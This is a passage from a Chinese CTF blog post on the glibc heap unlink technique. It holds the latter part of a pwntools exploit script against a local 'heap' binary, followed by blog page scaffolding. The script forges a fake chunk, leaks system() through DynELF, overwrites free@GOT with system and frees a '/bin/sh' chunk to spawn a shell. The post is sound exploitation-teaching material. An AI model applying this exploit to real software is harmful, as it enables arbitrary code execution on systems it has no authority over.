+    <span class="token comment" spellcheck="true"># p.sendline(str(index))</span>
+    <span class="token comment" spellcheck="true"># p.recvuntil('Set chunk data:')</span>
+    <span class="token comment" spellcheck="true"># p.sendline(data)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Set chunk index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Set chunk data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">del_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># p.recvuntil('5.Exit\n')</span>
+    <span class="token comment" spellcheck="true"># p.sendline('3')</span>
+    <span class="token comment" spellcheck="true"># p.recvuntil('Delete chunk index:')</span>
+    <span class="token comment" spellcheck="true"># p.sendline(str(index))</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Delete chunk index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">print_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Print chunk index:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'1.Add'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res
+
+
+
+raw_input<span class="token punctuation">(</span><span class="token string">'add_chunk'</span><span class="token punctuation">)</span>
+add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#0</span>
+add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#1</span>
+add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#2</span>
+add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#3</span>
+set_chunk<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#fake_chunk</span>
+payload <span class="token operator">=</span> <span class="token string">""</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0x8</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#2nd chunk </span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>
+
+set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">###########################</span>
+<span class="token comment" spellcheck="true"># pwndbg> parseheap</span>
+<span class="token comment" spellcheck="true"># addr                prev                size                 status              fd                bk                </span>
+<span class="token comment" spellcheck="true"># 0x9e04000           0x0                 0x88                 Freed                0x0              0x89</span>
+<span class="token comment" spellcheck="true"># 0x9e04088           0x80                0x88                 Used                None              None</span>
+<span class="token comment" spellcheck="true"># 0x9e04110           0x0                 0x88                 Used                None              None</span>
+<span class="token comment" spellcheck="true"># 0x9e04198           0x0                 0x88                 Used                None              None</span>
+<span class="token comment" spellcheck="true"># pwndbg> x/10wx 0x9e04000</span>
+<span class="token comment" spellcheck="true"># 0x9e04000:    0x00000000    0x00000089    0x00000000    0x00000089</span>
+<span class="token comment" spellcheck="true"># 0x9e04010:    0x08049d54    0x08049d58    0x41414141    0x41414141</span>
+<span class="token comment" spellcheck="true"># 0x9e04020:    0x41414141    0x41414141</span>
+<span class="token comment" spellcheck="true"># pwndbg> x/10wx 0x8049D60</span>
+<span class="token comment" spellcheck="true"># 0x8049d60:    0x09e04008    0x09e04090    0x09e04118    0x09e041a0</span>
+<span class="token comment" spellcheck="true"># 0x8049d70:    0x00000000    0x00000000    0x00000000    0x00000000</span>
+<span class="token comment" spellcheck="true"># 0x8049d80:    0x00000000    0x00000000</span>
+<span class="token comment" spellcheck="true"># pwndbg> </span>
+<span class="token comment" spellcheck="true">##########################</span>
+<span class="token comment" spellcheck="true"># pwnlib.gdb.attach(p)</span>
+<span class="token comment" spellcheck="true">#get the pointer</span>
+del_chunk<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8049d54</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8048420</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 修改的是全局记录的指针数组，即buf[1]已经变为了free@plt</span>
+
+raw_input<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#leak system_addr,通过DynELF，free@plt来泄露system的地址</span>
+pwn_elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>pwn_elf<span class="token punctuation">)</span>
+sys_addr <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system addr: %#x"</span> <span class="token operator">%</span> sys_addr<span class="token punctuation">)</span>
+
+raw_input<span class="token punctuation">(</span><span class="token string">'edit free@got'</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>
+set_chunk<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+
+set_chunk<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 把free@plt覆写为free@got的内容，因为前面已经运行了free,got记录了真正的free的地址</span>
+
+del_chunk<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>程序流程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564061750675.png" alt="1564061750675"></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力!</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.bmp" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechatpay.bmp" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://thonsun.github.io" class="b-link-green">thonsun's blog</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2019/07/25/unlink-li-yong-jie-shao/" class="b-link-green">unlink利用介绍</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+        clientSecret: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+        repo: 'shw2018.github.io',
+        owner: 'shw2018',
+        admin: ["shw2018"],
+        id: '2019/07/25/unlink-li-yong-jie-shao/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+    /* valine 评论框增加背景图片 */
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("") 100% 100% no-repeat;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    /* 修复评论第一行位置错位 */
+    .v .vlist .vcard {
+    padding-top: 2.5em !important ;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <link rel="stylesheet" type="text/css" href="/libs//libs/jQuery-emoji/dist/css/jquery.emoji.css">
+<script src="/libs//libs/jQuery-emoji/dist/js/jquery.emoji.min.js"></script>
+<script src="/libs//libs/jQuery-emoji/dist/js/emoji.list.js"></script> -->
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'ig6BIy8gfLtSxBmemGpByikj-gzGzoHsz',
+        appKey: 'I9U7wisCzEtdc5rcLsNsYDHK',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go',
+
+    });
+
+//     function parse_emoji() {
+//     jQuery(".vcontent").emojiParse({
+//       basePath: '/libs/jQuery-emoji/images/emoji',
+//       icons: emojiLists   // 注：详见 js/emoji.list.js
+//     });
+//   }
+  
+//   setTimeout(function() {
+//     // jQuery emoji 解析
+//     parse_emoji();
+//     // jquery emoji 初始化
+//     jQuery(".veditor").emoji({
+//       showTab: true,
+//       animation: 'slide',
+//       basePath: '/libs/jQuery-emoji/images/emoji',
+//       icons: emojiLists  // 注：详见 js/emoji.list.js
+//     });
+//     jQuery(".vmore").on("click", function() {
+//       setTimeout(function() {
+//         parse_emoji();
+//       }, 500);
+//     });
+//   }, 800)
+
+</script>
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/07/27/lief-zai-ctfpatch-chang-yong-api/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="LIEF在CTFpatch常用API">
+                        
+                        <span class="card-title">LIEF在CTFpatch常用API</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+使用电脑浏览效果更佳！
+
+摘要​    记录LIEF在CTF中打patch的常用函数，更多详细参考官方文档。 链接，此处记录在CTF方面的应用详细。LIEF不仅仅用于ELF文件的修改，还可以在PE，Mach-o，Android等方面都有应
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category" target="_blank">
+                                    pwn
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn-patch/" target="_blank">
+                        <span class="chip bg-color">pwn patch</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/07/24/off-by-one-li-yong-yuan-li/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="off by one 利用原理">
+                        
+                        <span class="card-title">off by one 利用原理</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+使用电脑浏览效果更佳！
+
+摘要​    记录分析off-by-one(off-by-null，只是覆盖一字节内容不同而已)的漏洞利用原理，使得萌新如我在看ctf-wiki上的pwn的glibc利用手法能够深入的了解off-by-one的原
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category" target="_blank">
+                                    pwn
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/heap/" target="_blank">
+                        <span class="chip bg-color">heap</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: thonsun's blog<br />'
+            + '作者: thonsun<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+        <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&copy; 2019 洪卫. 
+
+            <br>
+            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
+            <br>
+
+            
+
+            
+                    
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        总访问量: <span id="busuanzi_value_site_pv" class="white-color"></span>
+                    
+        
+                    
+                        <span id="busuanzi_container_site_uv" style='display:none'></span>
+                        人次&nbsp; | &nbsp;访客人数: <span id="busuanzi_value_site_uv" class="white-color"></span> 人
+                    
+    
+            
+
+            
+                &nbsp; | &nbsp;字数统计:&nbsp;
+                <span class="white-color">23k</span> 字
+            
+
+            
+            <br>
+
+        </div>
+
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/https://github.com/thonsun/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+ 
+    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=thonsun@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+    <a href="https://zhihu.com/people/thonsun" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=2280986957&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/thonsun" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
